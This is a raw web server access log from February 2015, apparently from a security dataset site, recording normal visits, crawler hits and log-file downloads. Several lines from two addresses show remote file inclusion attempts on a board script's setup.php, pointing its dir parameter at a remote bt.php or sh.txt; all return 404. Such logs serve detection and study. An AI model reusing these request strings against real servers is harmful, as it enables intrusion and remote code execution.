1.224.163.80 - - [10/Feb/2015:08:45:17 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:08:45:18 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:08:45:19 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
54.84.208.177 - - [10/Feb/2015:09:46:18 -0800] "HEAD / HTTP/1.1" 200 295 "-" "Mozilla/6.0 (compatible; MSIE 5.5; Windows NT 6.0)" 
157.55.39.191 - - [10/Feb/2015:10:08:11 -0800] "GET /maccdc2012/files.log.gz HTTP/1.1" 200 10941898 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
212.131.240.154 - - [10/Feb/2015:10:13:25 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
212.131.240.154 - - [10/Feb/2015:10:13:25 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 206 634 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
212.131.240.154 - - [10/Feb/2015:10:13:26 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 206 634 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
212.131.240.154 - - [10/Feb/2015:10:19:39 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
212.131.240.154 - - [10/Feb/2015:10:19:40 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 206 634 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
68.13.222.100 - - [10/Feb/2015:10:34:16 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:34:16 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:34:17 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:34:17 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
176.31.252.38 - - [10/Feb/2015:10:38:47 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:10:38:48 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:10:38:48 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:10:38:49 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
68.13.222.100 - - [10/Feb/2015:10:43:27 -0800] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 45019 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:43:32 -0800] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 128116 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:43:34 -0800] "GET /maccdc2012/notice.log.gz HTTP/1.1" 200 20779 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
